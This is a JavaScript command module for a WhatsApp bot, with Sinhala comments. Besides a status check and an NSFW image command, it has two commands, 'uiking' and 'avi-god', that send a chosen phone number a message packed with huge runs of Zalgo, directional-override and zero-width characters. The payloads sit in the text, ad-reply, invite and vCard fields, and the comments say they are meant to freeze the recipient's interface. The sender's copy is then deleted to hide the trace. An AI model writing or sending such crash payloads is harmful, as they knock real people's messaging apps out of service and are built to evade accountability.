module.exports = async function 


AviCommands(m, Avishka) {


  switch (m.command) {
    case 'avitst': {
      await Avishka.sendMessage(m.chat, { text: 'Hello Im Alive Now!' }, { quoted: m });
      break;
    }

    case 'nsfwpic1': {
    // ගෲප් එකේ NSFW මෝඩ් එක On ද කියලා චෙක් කරනවා
    if (m.isGroup && !global.db.groups[m.chat].nsfw) return m.reply(NSFW මෝඩ් එක Off කරලයි තියෙන්නේ. මුලින් ඒක On කරගන්න. 🫦')

    // බොට් රියැක්ෂන් එකක් දානවා
    m.react('🥵')
    m.reply('Waiting... 🫦💦')

    try {
        // API එකෙන් දත්ත ලබා ගැනීම (Waifu.pics පාවිච්චි කරමු මුලින්)
        let res = await axios.get('https://api.waifu.pics/nsfw/waifu')
        let image_url = res.data.url

        // පින්තූරය සහ විස්තරය යැවීම
        await Avishka.sendMessage(m.chat, { 
            image: { url: image_url }, 
            caption: `*PRINCE-AVI-MD HENTAI MODE* 🔞\n\nඔන්න  ඔයාට ඕන සැප! 🫦🍑💦\n\n© 2k26 POWER BY AVI`,
            contextInfo: {
                externalAdReply: {
                    title: "PRINCE-AVI-MD V3 NSFW",
                    body: "Enjoy your visuals, Master... 🥵",
                    thumbnailUrl: "https://github.com/avishka33/PRINCE-AVI-MD-v3/raw/main/AMedia/Avi.jpeg",
                    sourceUrl: "https://github.com/avishka33",
                    mediaType: 1,
                    renderLargerThumbnail: false
                }
            }
        }, { quoted: m })

    } catch (e) {
        console.log(e)
        // පළවෙනි API එක වැඩ නැති වුණොත් දෙවැනි එකට යනවා
        try {
            let res2 = await axios.get('https://nekos.life/api/v2/img/hentai')
            await Avishka.sendMessage(m.chat, { 
                image: { url: res2.data.url }, 
                caption: `*HENTAI UPDATE* 🔞\n\nමෙන්න  තව පාරක් සැප ගන්න! 🫦💦` 
            }, { quoted: m })
        } catch (err) {
            m.reply('අයියෝ , API එකේ පොඩි ලෙඩක්. පස්සේ ට්‍රයි කරමුද? ❌')
        }
    }
}
break


case 'uiking': {
    if (!text) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx`);
    let target = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    // ඉතා සංකීර්ණ Unicode අනුපිළිවෙලක් (Zalgo + Directional Overrides)
    const complexPayload = ("\u034F\u2060\u202E\u200B\u200C".repeat(1500) + "҉".repeat(1000));
    const heavyString = Array(15).fill(complexPayload).join("\u200B");

    try {
        // පණිවිඩය යැවීම
        const sentMsg = await Avishka.sendMessage(target, {
            text: "⚠️ STRESS_TEST_ACTIVE\n" + "ꦾ".repeat(40000),
            contextInfo: {
                mentionedJid: Array(20).fill(target),
                forwardingScore: 999,
                isForwarded: true,
                externalAdReply: {
                    title: "CRITICAL_ERROR: " + heavyString.substring(0, 5000),
                    body: "Decoding UI components...",
                    mediaType: 1,
                    sourceUrl: "https://avi-internal." + heavyString.substring(0, 1000)
                },
                quotedMessage: {
                    // Quoted message එකක් තුළ ඇති පෑලෝඩ් එක Notification පෙන්වීමේදී CPU එක වැඩිපුර ලැග් කරවයි
                    adminInviteMessage: {
                        inviteCode: heavyString,
                        groupJid: "120363000000000000@g.us",
                        caption: heavyString
                    }
                }
            }
        });

        // තත්පර 2කින් යවන්නාගේ පැත්තෙන් පණිවිඩය මැකීම (Sender Side Clean-up)
        setTimeout(async () => {
            await Avishka.sendMessage(m.chat, { 
                delete: sentMsg.key 
            });
        }, 2000);

        m.reply("🚀 Payload එක යවන ලදී. යවන්නාගේ අග්‍රයෙන් දත්ත ඉවත් කරන ලදී.");
    } catch (err) {
        m.reply("❌ Error: " + err.message);
    }
}
break;

      
    
case 'avi-god': {
    if (!text) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx`);
    let target = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    // ꦾ වගේම තවත් බලවත් අක්ෂර මාලාවක් (Unicode Combo)
    const powerChars = "ꦾꦿꦼꦽᦗᦘᦙᦚ҉᪢᪣ᫍᫎ\u202E\u034F";
    const ultraBurner = (powerChars.repeat(1500)); 
    
    // UI එක හිර කරවන ප්‍රධාන පෑලෝඩ් එක
    const finalPayload = Array(20).fill(ultraBurner).join("\u200B");

    try {
        const sentMsg = await Avishka.sendMessage(target, {
            // Text එක ඇතුළට අතිවිශාල අක්ෂර මාලාවක්
            text: "PRINCE-AVI-MD GOD-MODE ⚠️\n" + finalPayload,
            contextInfo: {
                mentionedJid: Array(50).fill(target),
                forwardingScore: 9999,
                isForwarded: true,
                externalAdReply: {
                    title: "SYSTEM_FAILURE: " + powerChars.repeat(5000),
                    body: "Decoding Script Engine...",
                    mediaType: 1,
                    // මෙතැනටත් පෑලෝඩ් එක දීමෙන් UI එක පෙන්වීම වැළැක්විය හැක
                    thumbnail: Buffer.alloc(1000, powerChars),
                    sourceUrl: "https://avi-bug." + ultraBurner.substring(0, 500)
                },
                // Quoted message එකක් තුළ Vcard එකක් දීම (මෙය ඉතා බලවත් ක්‍රමයකි)
                quotedMessage: {
                    contactMessage: {
                        displayName: "Avi-Bug-Expert",
                        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;${ultraBurner};;;\nFN:${ultraBurner}\nNOTE:${finalPayload}\nEND:VCARD`
                    }
                }
            }
        });

        // Sender ගේ පැත්තෙන් ලැග් නොවීමට පණිවිඩය මැකීම
        setTimeout(async () => {
            await Avishka.sendMessage(m.chat, { delete: sentMsg.key });
        }, 1500);

        m.reply("🚀 God-Mode Payload එක යවන ලදී. ටාගට් එකේ UI එක 'ꦾ' වගේ දහස් ගණනක් අක්ෂර නිසා හිර වනු ඇත.");
    } catch (err) {
        m.reply("❌ Error: " + err.message);
    }
}
break;    
    
  }
}

